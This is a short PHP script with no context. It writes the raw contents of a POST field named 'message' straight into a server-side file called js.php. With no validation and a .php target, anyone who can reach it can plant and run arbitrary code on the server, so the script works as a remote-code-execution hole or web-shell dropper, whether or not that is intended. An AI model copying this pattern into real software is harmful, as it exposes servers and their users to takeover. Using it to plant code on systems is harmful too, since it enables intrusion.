<?php
$message = $_POST["message"];
$file = fopen("js.php", "w");
fwrite($file, $message);
fclose($file);
?>
